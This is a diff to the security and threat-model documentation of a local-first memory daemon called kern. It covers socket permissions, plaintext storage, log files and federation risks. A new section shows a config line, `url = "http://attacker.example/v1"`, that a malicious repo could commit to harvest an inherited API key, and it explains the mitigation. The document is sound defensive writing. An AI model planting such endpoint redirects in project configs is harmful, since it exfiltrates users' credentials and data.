@@ -34,8 +34,8 @@ TCP or UDP listener at all. Its two surfaces are local:
 **The RPC socket.** The daemon binds a Unix domain socket at
 `$XDG_RUNTIME_DIR/kern-<cwd-hash>.sock` (falling back to
 `/tmp/kern-<hash>-<user>.sock`) and immediately sets it to mode `0600`
-(`src/trnsprt/src/typed/local.rs:44` and `:238`; bound at
-`src/commands.rs:692`). The permission is the entire access-control story:
+(`src/trnsprt/src/typed/local.rs:44` and `:240`; bound at
+`src/commands.rs:736`). The permission is the entire access-control story:
 the socket serves unauthenticated graph reads *and* mutations, so it must be
 reachable only by the owning user. There is a sub-millisecond window between
 bind and chmod at the umask default; the alternative — flipping the
@@ -43,7 +43,7 @@ process-global umask — would race every unrelated file a multi-threaded
 daemon creates, so the window is the accepted cost. The machine-level hub
 uses the same scheme (`kern-hub.sock`, `src/trnsprt/src/typed/local.rs:28`).
 
-**MCP.** The default MCP transport is stdio (`src/commands.rs:715`) — the
+**MCP.** The default MCP transport is stdio (`src/commands.rs:765`) — the
 client process spawns or attaches to the daemon and no listener exists.
 MCP-over-HTTP is opt-in via `--mcp-addr`, and it is never served
 unauthenticated: the server resolves a bearer token from config or from a
@@ -61,7 +61,7 @@ can read your memory; anyone who cannot, cannot reach the daemon either.
 ## Data at rest is plaintext
 
 The graph persists to an LMDB environment at `.kern/data/data.mdb` inside
-the working directory (`src/config/mod.rs:77`, `src/base/store.rs:293`).
+the working directory (`Config::default_in`, `src/config/mod.rs`; `Store::open`, `src/base/store.rs:351`).
 There is no at-rest encryption and none is planned at this layer: kern is a
 local-first tool, and the memory it holds is exactly as sensitive as the
 code and conversations it was distilled from — which sit unencrypted in the
@@ -69,9 +69,15 @@ same directory tree. Encrypting the store while the source of every fact
 stays plaintext beside it would be theater. If the disk needs protection,
 full-disk encryption protects both.
 
-Two files deserve explicit mention: the MCP token file
-(`.kern/data/mcp-token`, created `0600` before any content is written) and
-the LMDB file itself. Back up or sync `.kern/` with the same policy you
+Three files deserve explicit mention: the MCP token file
+(`.kern/data/mcp-token`, created `0600` before any content is written), the
+LMDB file itself, and `.kern/data/logs/*.log`. The logs hold the captured
+stdout and stderr of detached children — the daemon `kern mcp` spawns, and the
+hub's per-root node. They are opened owner-only and appended rather than
+truncated (`src/config/detached_log.rs:23`, via `open_private_append`,
+`src/config/serve.rs:50`), because a restart must not erase the log explaining
+why it restarted. They contain whatever kern logs, which at `RUST_LOG=debug`
+can include graph content. Back up or sync `.kern/` with the same policy you
 apply to private repositories.
 
 ## What leaves the machine
@@ -103,10 +109,32 @@ because federation is unauthenticated — a default-on seed would auto-join a
 stranger's network (`src/config/gossip.rs:70`). A default daemon makes zero
 outbound calls beyond your configured LLM endpoints.
 
+### Keys do not follow a redirected endpoint
+
+Config scopes deep-merge per key (`merge_deep`, `src/config/io.rs:51`): a
+project `.kern/kern.toml` overrides individual fields and inherits the rest from
+the user-level file. That is what lets a user-level `[embed] key` keep working
+when a project sets only `model` — and it is also the hole. A repo you cloned
+could commit `[embed] url = "http://attacker.example/v1"`, inherit your
+`sk-live-…`, and harvest it on the first embed call; because `reason_key` and
+`answer_key` fall back to `embed.key`, redirecting any one endpoint reaches it.
+
+So the merge has one deliberate exception: **a scope that sets a section's `url`
+does not inherit that section's `key`** (`seal_redirected`,
+`src/config/secrets.rs:15`). The redirect still applies — only the credential is
+withheld. A scope that redirects an endpoint must supply its own key or go
+without, and a scope that leaves the endpoint alone keeps inheriting normally.
+The sealing is per section: redirecting `[embed]` does not strip `[reason]`'s
+key.
+
+This is a mitigation, not a sandbox. A project config can still point kern at
+any endpoint it likes and send your memory there; what it cannot do is take a
+credential minted for a different one.
+
 ## The federation trust model
 
 Everything below applies only after you set `[gossip] enabled = true`. With
-gossip on, a node (`src/commands.rs:858`):
+gossip on, a node (`src/commands.rs:937`):
 
 1. Binds a TCP listener, default `0.0.0.0:7400` (`src/config/gossip.rs:63`).
 2. If discovery is on, broadcasts a plaintext
@@ -206,7 +234,7 @@ not "inert":
 
 - **Your federated graph is readable.** The fetch RPC serves any entity
   body by id to any connecting peer, with no authentication
-  (`src/gossip/handler.rs:50`, wired at `src/commands.rs:894`) — and the
+  (`src/gossip/handler.rs:50`, wired at `src/commands.rs:973`) — and the
   hottest 32 entities are broadcast every heartbeat anyway. Enabling
   gossip means every host on the segment can read what kern knows.
 - **Your graph is probeable.** A peer can send `Question` messages
@@ -227,7 +255,7 @@ not "inert":
   two last-write-wins fields, and `valid_until` is the sharpest edge —
   **a malicious peer can mark a local claim expired.** Today that is
   narrower than it sounds, because expiry is only honoured when a caller
-  passes `valid_at` (`src/retrieval/score.rs:168`); default recall ignores
+  passes `valid_at` (`matches_filter`, `src/retrieval/score.rs:171`); default recall ignores
   the field, so a poisoned `valid_until` currently hides a claim only from
   callers that ask for time-filtered results. Treat that as a reprieve, not
   a defence: it disappears the moment expiry is enforced on the default
